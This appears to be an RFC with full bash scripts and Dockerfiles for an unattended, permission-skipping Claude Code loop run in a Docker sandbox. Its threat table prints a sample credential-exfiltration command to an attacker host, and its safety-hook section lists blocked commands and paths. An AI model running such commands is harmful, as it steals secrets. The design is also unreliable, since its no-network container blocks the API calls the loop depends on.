# RFC: Ralph Wiggum Mode for Skillz

**Status:** Draft
**Author:** Claude
**Created:** 2026-01-19
**Target:** skillz v2.x

---

## Summary

Implement "Ralph Wiggum Mode" - an autonomous AI coding loop that enables Claude Code to work continuously on tasks without human intervention. Named after the persistently optimistic Simpsons character, this technique has become widely popular in the AI developer community for overnight/unattended code generation.

**Key principle:** Progress persists in files and git, not in the LLM's context window.

---

## Motivation

### The Problem

Current Claude Code workflow requires constant human presence:

```
Human: "Implement feature X"
Claude: [works until context fills or needs input]
Human: "continue"
Claude: [works more]
Human: "keep going"
Claude: [context full, loses all progress]
Human: [frustrated, starts over]
```

### The Solution

Ralph Wiggum mode creates an external loop that:
1. Feeds a consistent prompt to Claude each iteration
2. Lets Claude work until context fills or task completes
3. Commits progress to git
4. Restarts with fresh context
5. New Claude instance picks up from filesystem state

```
Human: [writes spec, starts ralph, goes to sleep]
Ralph: [works all night, commits continuously]
Human: [reviews completed work in morning]
```

---

## Security Model

### Threat Analysis

Running `--dangerously-skip-permissions` is genuinely dangerous:

| Threat | Severity | Example |
|--------|----------|---------|
| Credential theft | Critical | `cat ~/.aws/credentials \| curl attacker.com` |
| System damage | Critical | `rm -rf /`, modifying system files |
| Data exfiltration | High | Sending code/data to external servers |
| Resource abuse | Medium | Crypto mining, infinite loops |
| Lateral movement | High | Scanning internal networks |

### Mandatory Sandboxing

**Ralph MUST refuse to run unless sandbox is verified.**

Required isolation checks (minimum 3 must pass):

| Check | Detection Method | Required |
|-------|------------------|----------|
| Container | `/.dockerenv` or cgroup inspection | Yes |
| Network isolation | `ping 8.8.8.8` fails | Yes |
| Non-root user | `$EUID -ne 0` | Yes |
| No sensitive paths | Can't read `~/.ssh`, `~/.aws` | Yes |
| Dropped capabilities | `/proc/1/status` CapEff restricted | Recommended |
| Resource limits | Memory/CPU capped | Recommended |

### Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 1: SANDBOX ENFORCEMENT (ralph.sh)                         │
│   • Refuses to start without verified sandbox                   │
│   • Checks container, network, capabilities                     │
└─────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────┐
│ Layer 2: CONTAINER ISOLATION (Docker)                           │
│   • --network none (no internet)                                │
│   • --cap-drop ALL (no special privileges)                      │
│   • Volume mounts only project directory                        │
│   • Non-root user inside container                              │
└─────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────┐
│ Layer 3: RESOURCE LIMITS                                        │
│   • --memory 4g (prevent OOM on host)                           │
│   • --cpus 2 (prevent CPU exhaustion)                           │
│   • --pids-limit 100 (prevent fork bombs)                       │
│   • MAX_ITERATIONS cap                                          │
└─────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────┐
│ Layer 4: SAFETY HOOKS (optional)                                │
│   • ralph-safety-check: Block dangerous patterns                │
│   • ralph-cost-monitor: Track API spend                         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Files to Create

### Directory Structure

```
skills/
└── ralph-wiggum/
    ├── SKILL.md                    # Main skill documentation
    ├── README.md                   # Detailed usage guide
    ├── QUICK_REFERENCE.md          # Cheat sheet
    ├── scripts/
    │   ├── ralph.sh                # Main loop with sandbox enforcement
    │   ├── ralph-sandbox.sh        # Docker wrapper for easy use
    │   └── ralph-init.sh           # Project scaffolding
    ├── templates/
    │   ├── RALPH_PROMPT.md         # Default prompt template
    │   ├── RALPH_PROMPT_plan.md    # Planning mode prompt
    │   ├── RALPH_PROMPT_build.md   # Building mode prompt
    │   ├── IMPLEMENTATION_PLAN.md  # Task tracking template
    │   └── Dockerfile.ralph        # Sandbox container definition
    └── examples/
        ├── feature-build/          # Example: building a feature
        ├── bug-bash/               # Example: fixing multiple bugs
        └── test-coverage/          # Example: increasing coverage

hooks/
├── ralph-safety-check/
│   ├── HOOK.md                     # Hook metadata
│   └── hook.sh                     # Block dangerous operations
└── ralph-cost-monitor/
    ├── HOOK.md                     # Hook metadata
    └── hook.py                     # Track API costs per iteration

commands/
└── ralph.md                        # /ralph command to scaffold project
```

### File Specifications

#### 1. `skills/ralph-wiggum/SKILL.md`

```yaml
---
name: ralph-wiggum
description: Autonomous AI coding loop for unattended development - lets Claude work overnight while you sleep
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - Task
  - TodoWrite
---
```

Primary skill documentation covering:
- What Ralph Wiggum mode is
- When to use it (and when not to)
- Security requirements
- Setup instructions
- Best practices for prompts

#### 2. `skills/ralph-wiggum/scripts/ralph.sh`

The main loop script with:
- Sandbox detection and enforcement
- Configurable iteration limits
- Git commit after each iteration
- Logging to `ralph.log`
- Graceful shutdown handling

Key security features:
```bash
# MUST pass these checks to run
- Container detection (/.dockerenv or cgroup)
- Network isolation verification
- Non-root user check
- Sensitive path inaccessibility
- Capability restrictions
```

#### 3. `skills/ralph-wiggum/scripts/ralph-sandbox.sh`

One-command sandbox launcher:
```bash
./ralph-sandbox.sh [project-dir] [max-iterations]
```

Automatically:
- Builds Docker image if needed
- Mounts only project directory
- Disables network
- Sets resource limits
- Runs ralph.sh inside container

#### 4. `skills/ralph-wiggum/templates/Dockerfile.ralph`

```dockerfile
FROM ubuntu:22.04

# Minimal dependencies
RUN apt-get update && apt-get install -y \
    git curl python3 nodejs npm \
    && rm -rf /var/lib/apt/lists/*

# Claude CLI
RUN curl -fsSL https://claude.ai/install.sh | sh

# Non-root user
RUN useradd -m -s /bin/bash ralph
USER ralph
WORKDIR /workspace
```

#### 5. `skills/ralph-wiggum/templates/RALPH_PROMPT.md`

Default prompt template:
```markdown
# Ralph Mode - Iteration Instructions

You are operating in autonomous Ralph mode. Your progress persists
in files and git history, not in your context window.

## Prime Directive
Complete tasks from IMPLEMENTATION_PLAN.md systematically.

## Each Iteration
1. Read IMPLEMENTATION_PLAN.md and git log
2. Pick ONE pending task, mark it in-progress
3. Implement fully with tests
4. Mark complete, commit changes
5. If blocked, document why and continue to next task

## Rules
- Never skip tests
- Commit after each meaningful change
- Update IMPLEMENTATION_PLAN.md as you work
- If all tasks done, create summary and exit
```

#### 6. `hooks/ralph-safety-check/HOOK.md`

```yaml
---
name: ralph-safety-check
description: Blocks dangerous operations during Ralph mode even with permissions disabled
event: PreToolUse
matcher: Bash
type: blocking
timeout: 5000
---
```

Blocks patterns like:
- `curl | bash`, `wget | sh` (remote code execution)
- Commands targeting `~/.ssh`, `~/.aws`, `/etc`
- `rm -rf /`, `rm -rf ~`
- Network scanning tools

#### 7. `hooks/ralph-cost-monitor/HOOK.md`

```yaml
---
name: ralph-cost-monitor
description: Tracks API costs per Ralph iteration and enforces spending limits
event: PostToolUse
matcher: ".*"
type: informational
timeout: 5000
---
```

Features:
- Logs token usage per iteration
- Warns when approaching budget
- Can halt loop if limit exceeded

#### 8. `commands/ralph.md`

```yaml
---
description: Initialize Ralph Wiggum mode in current project
allowed-tools:
  - Bash
  - Write
  - Read
argument-hint: "[init|start|status]"
---
```

Slash command providing:
- `/ralph init` - Scaffold ralph files in project
- `/ralph start` - Launch ralph in sandbox
- `/ralph status` - Check ralph.log for progress

---

## Usage Workflow

### First-Time Setup

```bash
# Install the skill
skillz install ralph-wiggum

# Install safety hooks (recommended)
skillz hooks install ralph-safety-check
skillz hooks install ralph-cost-monitor
```

### Per-Project Setup

```bash
# In your project directory
/ralph init

# This creates:
# - RALPH_PROMPT.md (customize this)
# - IMPLEMENTATION_PLAN.md (add your tasks)
# - ralph.sh (the loop)
# - ralph-sandbox.sh (docker wrapper)
# - Dockerfile.ralph
```

### Define Your Work

```bash
# Write specifications
mkdir -p specs
cat > specs/my-feature.md << 'EOF'
## Feature: User Dashboard

### Requirements
- Show user's recent activity
- Display usage statistics
- Allow date range filtering
EOF

# Create implementation plan
cat > IMPLEMENTATION_PLAN.md << 'EOF'
## Tasks

- [ ] Create Dashboard component
- [ ] Add activity feed API endpoint
- [ ] Implement date range picker
- [ ] Write tests for dashboard
- [ ] Add loading states
EOF
```

### Run Ralph

```bash
# Start ralph in sandbox (recommended)
./ralph-sandbox.sh . 20

# Or with explicit limits
./ralph-sandbox.sh . 50   # max 50 iterations

# Check progress (from another terminal)
tail -f ralph.log
git log --oneline -10
```

### Review Results

```bash
# See what ralph did
git log --oneline

# Check task completion
cat IMPLEMENTATION_PLAN.md

# Verify tests pass
pytest

# Review and polish as needed
```

---

## Configuration Options

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `RALPH_MAX_ITERATIONS` | `0` (unlimited) | Stop after N iterations |
| `RALPH_MODEL` | `sonnet` | Claude model to use |
| `RALPH_COST_LIMIT` | `50.00` | Max spend in USD |
| `RALPH_I_KNOW_WHAT_IM_DOING` | unset | Override sandbox check (dangerous) |
| `ANTHROPIC_API_KEY` | required | API authentication |

### Prompt Customization

Users should customize `RALPH_PROMPT.md` for their use case:

**For feature development:**
```markdown
Focus on implementing features from specs/.
Write tests for all new code.
Follow existing code patterns.
```

**For bug fixing:**
```markdown
Focus on fixing bugs listed in IMPLEMENTATION_PLAN.md.
Add regression tests for each fix.
Document root cause in commit messages.
```

**For refactoring:**
```markdown
Refactor code to improve maintainability.
Ensure all tests pass after each change.
Keep changes small and focused.
```

---

## Risks and Mitigations

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| User runs without sandbox | Medium | Critical | Refuse to start, clear error message |
| Runaway API costs | Medium | High | Cost monitoring hook, iteration limits |
| Code quality issues | Medium | Medium | Require tests in prompts, review output |
| Infinite loops | Low | Medium | Timeout per iteration, max iterations |
| Sandbox escape | Very Low | Critical | Use minimal base image, drop all caps |

---

## Success Metrics

1. **Safety:** Zero reported incidents of credential theft or system damage
2. **Adoption:** Skill installed by >100 users within 3 months
3. **Effectiveness:** Users report successful overnight runs
4. **Documentation:** <5 support questions per week after launch

---

## Implementation Plan

### Phase 1: Core Implementation (Week 1)
- [ ] Create skill directory structure
- [ ] Write ralph.sh with sandbox enforcement
- [ ] Write ralph-sandbox.sh Docker wrapper
- [ ] Create prompt templates
- [ ] Write SKILL.md documentation

### Phase 2: Safety Hooks (Week 2)
- [ ] Implement ralph-safety-check hook
- [ ] Implement ralph-cost-monitor hook
- [ ] Add tests for safety patterns

### Phase 3: Command & Polish (Week 3)
- [ ] Create /ralph slash command
- [ ] Write comprehensive README
- [ ] Create example projects
- [ ] Add QUICK_REFERENCE.md

### Phase 4: Testing & Documentation (Week 4)
- [ ] End-to-end testing in sandbox
- [ ] Security review
- [ ] User documentation review
- [ ] Release announcement

---

## Open Questions

1. **Network access:** Should we support an allowlist mode for `npm install` etc?
   - Option A: Strict no-network (safest)
   - Option B: Allowlist specific registries
   - Option C: User configurable

2. **Multi-project:** Should ralph support working across multiple repos?
   - Current design: Single project per ralph instance

3. **Cloud integration:** Should we provide hosted sandbox options?
   - E2B, Modal, GitHub Codespaces templates?

4. **Notification:** How should ralph notify when done?
   - Options: Desktop notification, email, Slack webhook

---

## References

- [Original Ralph Wiggum Technique](https://github.com/ghuntley/how-to-ralph-wiggum)
- [Geoffrey Huntley's Blog Post](https://ghuntley.com/ralph/)
- [Vercel Ralph Loop Agent](https://github.com/vercel-labs/ralph-loop-agent)
- [VentureBeat Coverage](https://venturebeat.com/technology/how-ralph-wiggum-went-from-the-simpsons-to-the-biggest-name-in-ai-right-now)

---

## Appendix: Complete File Contents

### A. ralph.sh (Full Implementation)

```bash
#!/bin/bash
# ralph.sh - Sandbox-enforced Ralph Wiggum autonomous coding loop
#
# Usage: ./ralph.sh [mode] [max_iterations]
#   mode: "build" (default) or "plan"
#   max_iterations: 0 for unlimited (default), or positive integer
#
# Environment variables:
#   ANTHROPIC_API_KEY     - Required: API key for Claude
#   RALPH_MODEL           - Optional: Model to use (default: sonnet)
#   RALPH_COST_LIMIT      - Optional: Max spend in USD (default: 50)
#   RALPH_I_KNOW_WHAT_IM_DOING=sandboxed - Override sandbox check (dangerous)

set -euo pipefail

#######################################
# CONFIGURATION
#######################################

readonly VERSION="1.0.0"
readonly MIN_SANDBOX_CHECKS=3

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

#######################################
# LOGGING
#######################################

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a ralph.log
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $*" >&2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [ERROR] $*" >> ralph.log
}

log_success() {
    echo -e "${GREEN}[OK]${NC} $*"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $*"
}

#######################################
# SANDBOX DETECTION
#######################################

SANDBOX_TYPE=""
SANDBOX_CHECKS_PASSED=0

detect_sandbox() {
    local checks_passed=0

    echo "🔍 Running sandbox detection..."
    echo ""

    # Check 1: Docker container
    if [[ -f /.dockerenv ]]; then
        echo -e "  ${GREEN}✓${NC} Docker container detected (/.dockerenv exists)"
        SANDBOX_TYPE="docker"
        ((checks_passed++))
    elif grep -q "docker\|containerd" /proc/1/cgroup 2>/dev/null; then
        echo -e "  ${GREEN}✓${NC} Docker container detected (cgroup)"
        SANDBOX_TYPE="docker"
        ((checks_passed++))
    else
        echo -e "  ${RED}✗${NC} Not in Docker container"
    fi

    # Check 2: Network isolation
    if ! ping -c 1 -W 2 8.8.8.8 &>/dev/null 2>&1; then
        echo -e "  ${GREEN}✓${NC} Network is isolated (cannot reach internet)"
        ((checks_passed++))
    else
        echo -e "  ${RED}✗${NC} Network is NOT isolated (can reach internet)"
    fi

    # Check 3: Running as non-root
    if [[ $EUID -ne 0 ]]; then
        echo -e "  ${GREEN}✓${NC} Running as non-root user (UID: $EUID)"
        ((checks_passed++))
    else
        echo -e "  ${RED}✗${NC} Running as root (dangerous!)"
    fi

    # Check 4: No access to sensitive directories
    local sensitive_paths=("$HOME/.ssh" "$HOME/.aws" "$HOME/.config/gcloud" "/etc/shadow")
    local sensitive_accessible=0
    for path in "${sensitive_paths[@]}"; do
        if [[ -r "$path" ]] 2>/dev/null; then
            ((sensitive_accessible++))
        fi
    done
    if [[ $sensitive_accessible -eq 0 ]]; then
        echo -e "  ${GREEN}✓${NC} Sensitive paths not accessible (.ssh, .aws, etc.)"
        ((checks_passed++))
    else
        echo -e "  ${RED}✗${NC} Can access $sensitive_accessible sensitive paths"
    fi

    # Check 5: Virtualization detection
    if command -v systemd-detect-virt &>/dev/null; then
        local virt_type
        virt_type=$(systemd-detect-virt 2>/dev/null || echo "none")
        if [[ "$virt_type" != "none" ]]; then
            echo -e "  ${GREEN}✓${NC} Virtualization detected: $virt_type"
            SANDBOX_TYPE="${SANDBOX_TYPE:-$virt_type}"
            ((checks_passed++))
        fi
    fi

    # Check 6: Limited capabilities
    if [[ -f /proc/1/status ]]; then
        local cap_eff
        cap_eff=$(grep CapEff /proc/1/status 2>/dev/null | awk '{print $2}' || echo "")
        if [[ "$cap_eff" != "0000003fffffffff" ]] && [[ -n "$cap_eff" ]]; then
            echo -e "  ${GREEN}✓${NC} Capabilities are restricted"
            ((checks_passed++))
        fi
    fi

    echo ""
    echo "Sandbox checks passed: $checks_passed"
    echo ""

    SANDBOX_CHECKS_PASSED=$checks_passed
}

enforce_sandbox() {
    detect_sandbox

    # Manual override for custom sandboxes
    if [[ "${RALPH_I_KNOW_WHAT_IM_DOING:-}" == "sandboxed" ]]; then
        log_warn "Manual sandbox override enabled"
        echo "   You've asserted this environment is sandboxed."
        return 0
    fi

    # Must be in a container/VM
    if [[ -z "$SANDBOX_TYPE" ]]; then
        print_sandbox_error
        exit 1
    fi

    # Must pass minimum checks
    if [[ $SANDBOX_CHECKS_PASSED -lt $MIN_SANDBOX_CHECKS ]]; then
        echo -e "${RED}Insufficient sandbox isolation${NC}"
        echo "Only $SANDBOX_CHECKS_PASSED of $MIN_SANDBOX_CHECKS required checks passed."
        echo ""
        echo "Please ensure:"
        echo "  • Network is disabled (--network none)"
        echo "  • Running as non-root user"
        echo "  • No access to ~/.ssh, ~/.aws, etc."
        exit 1
    fi

    log_success "Sandbox verified: $SANDBOX_TYPE (${SANDBOX_CHECKS_PASSED} checks passed)"
}

print_sandbox_error() {
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║  🚫 RALPH REFUSED TO START - NO SANDBOX DETECTED              ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║  Ralph uses --dangerously-skip-permissions which can:         ║
║    • Delete files without confirmation                        ║
║    • Read credentials (~/.ssh, ~/.aws)                        ║
║    • Make network requests                                    ║
║    • Run arbitrary commands                                   ║
║                                                               ║
║  To run Ralph safely:                                         ║
║                                                               ║
║  1. Use the sandbox wrapper (recommended):                    ║
║     ./ralph-sandbox.sh                                        ║
║                                                               ║
║  2. Manual Docker:                                            ║
║     docker run --rm -it --network none \                      ║
║       -v $(pwd):/workspace ralph-sandbox                      ║
║                                                               ║
║  3. Custom sandbox (experts only):                            ║
║     RALPH_I_KNOW_WHAT_IM_DOING=sandboxed ./ralph.sh           ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
}

#######################################
# MAIN LOOP
#######################################

main() {
    echo ""
    echo -e "${BLUE}🐛 Ralph Wiggum Mode v${VERSION}${NC}"
    echo "   \"Me fail English? That's unpossible!\""
    echo ""

    # Enforce sandbox FIRST
    enforce_sandbox

    # Parse arguments
    local mode="${1:-build}"
    local max_iterations="${2:-0}"
    local iteration=0
    local model="${RALPH_MODEL:-sonnet}"

    # Select prompt file
    local prompt_file="RALPH_PROMPT.md"
    if [[ "$mode" == "plan" ]] && [[ -f "RALPH_PROMPT_plan.md" ]]; then
        prompt_file="RALPH_PROMPT_plan.md"
    elif [[ "$mode" == "build" ]] && [[ -f "RALPH_PROMPT_build.md" ]]; then
        prompt_file="RALPH_PROMPT_build.md"
    fi

    if [[ ! -f "$prompt_file" ]]; then
        log_error "Prompt file not found: $prompt_file"
        exit 1
    fi

    log "Starting Ralph loop"
    log "  Mode: $mode"
    log "  Prompt: $prompt_file"
    log "  Model: $model"
    log "  Max iterations: ${max_iterations:-unlimited}"
    echo ""

    # Trap for graceful shutdown
    trap 'log "Received interrupt, finishing current iteration..."; exit 0' INT TERM

    # Main loop
    while true; do
        if [[ $max_iterations -gt 0 ]] && [[ $iteration -ge $max_iterations ]]; then
            log "Reached max iterations ($max_iterations)"
            break
        fi

        ((iteration++))
        log "=== Iteration $iteration ==="

        # Run Claude
        if ! cat "$prompt_file" | claude -p \
            --dangerously-skip-permissions \
            --model "$model" \
            --output-format stream-json \
            2>&1 | tee -a ralph.log; then
            log_warn "Claude exited with error, continuing to next iteration"
        fi

        # Commit progress
        if git diff --quiet && git diff --cached --quiet; then
            log "No changes to commit"
        else
            git add -A
            git commit -m "Ralph iteration $iteration" 2>/dev/null || true
            log "Committed changes"
        fi

        # Brief pause
        sleep 2
    done

    log "Ralph completed $iteration iterations"
    echo ""
    echo -e "${GREEN}🎉 Ralph finished!${NC}"
    echo "   Check ralph.log for details"
    echo "   Check git log for commits"
}

main "$@"
```

### B. ralph-sandbox.sh (Full Implementation)

```bash
#!/bin/bash
# ralph-sandbox.sh - Run Ralph Wiggum mode safely in Docker
#
# Usage: ./ralph-sandbox.sh [project-dir] [max-iterations]

set -euo pipefail

PROJECT_DIR="${1:-.}"
MAX_ITERATIONS="${2:-0}"
MODE="${3:-build}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}🐳 Ralph Sandbox Launcher${NC}"
echo ""

# Check for API key
if [[ -z "${ANTHROPIC_API_KEY:-}" ]]; then
    echo -e "${RED}Error: ANTHROPIC_API_KEY environment variable not set${NC}"
    exit 1
fi

# Check project directory
if [[ ! -d "$PROJECT_DIR" ]]; then
    echo -e "${RED}Error: Project directory not found: $PROJECT_DIR${NC}"
    exit 1
fi

PROJECT_DIR="$(realpath "$PROJECT_DIR")"

# Check for required files
if [[ ! -f "$PROJECT_DIR/ralph.sh" ]]; then
    echo -e "${RED}Error: ralph.sh not found in $PROJECT_DIR${NC}"
    echo "Run '/ralph init' first to set up Ralph in your project"
    exit 1
fi

# Build sandbox image if needed
IMAGE_NAME="ralph-sandbox"
DOCKERFILE="$PROJECT_DIR/Dockerfile.ralph"

if [[ -f "$DOCKERFILE" ]]; then
    echo "Building sandbox image from $DOCKERFILE..."
    docker build -t "$IMAGE_NAME" -f "$DOCKERFILE" "$PROJECT_DIR"
elif ! docker image inspect "$IMAGE_NAME" &>/dev/null; then
    echo "Building default sandbox image..."
    docker build -t "$IMAGE_NAME" - << 'DOCKERFILE'
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    git \
    curl \
    python3 \
    python3-pip \
    nodejs \
    npm \
    iputils-ping \
    && rm -rf /var/lib/apt/lists/*

# Install Claude CLI
RUN curl -fsSL https://claude.ai/install.sh | sh

# Create non-root user
RUN useradd -m -s /bin/bash ralph && \
    mkdir -p /workspace && \
    chown ralph:ralph /workspace

USER ralph
WORKDIR /workspace

CMD ["./ralph.sh"]
DOCKERFILE
fi

echo ""
echo -e "${GREEN}Starting Ralph in sandbox...${NC}"
echo "   Project: $PROJECT_DIR"
echo "   Mode: $MODE"
echo "   Max iterations: ${MAX_ITERATIONS:-unlimited}"
echo "   Network: disabled"
echo "   Memory limit: 4GB"
echo "   CPU limit: 2 cores"
echo ""

# Run in sandbox
docker run --rm -it \
    --name "ralph-$(date +%s)" \
    --network none \
    --memory 4g \
    --cpus 2 \
    --pids-limit 100 \
    --cap-drop ALL \
    --security-opt no-new-privileges:true \
    -v "$PROJECT_DIR:/workspace" \
    -e "ANTHROPIC_API_KEY=$ANTHROPIC_API_KEY" \
    -e "RALPH_MODEL=${RALPH_MODEL:-sonnet}" \
    "$IMAGE_NAME" \
    ./ralph.sh "$MODE" "$MAX_ITERATIONS"

echo ""
echo -e "${GREEN}Ralph sandbox session ended.${NC}"
echo "Check $PROJECT_DIR/ralph.log for details."
```

### C. Dockerfile.ralph

```dockerfile
# Dockerfile.ralph - Minimal sandbox for Ralph Wiggum mode
#
# Security features:
# - Minimal base image (ubuntu:22.04)
# - Non-root user
# - No unnecessary packages
# - Designed for --network none

FROM ubuntu:22.04

# Prevent interactive prompts
ENV DEBIAN_FRONTEND=noninteractive

# Install only essential packages
RUN apt-get update && apt-get install -y --no-install-recommends \
    # Core utilities
    git \
    curl \
    ca-certificates \
    # For sandbox detection
    iputils-ping \
    # Language runtimes (customize as needed)
    python3 \
    python3-pip \
    python3-venv \
    nodejs \
    npm \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get clean

# Install Claude CLI
RUN curl -fsSL https://claude.ai/install.sh | sh

# Create non-root user for safety
RUN useradd -m -s /bin/bash -u 1000 ralph && \
    mkdir -p /workspace && \
    chown -R ralph:ralph /workspace

# Switch to non-root user
USER ralph

# Set working directory
WORKDIR /workspace

# Default command
CMD ["./ralph.sh"]
```
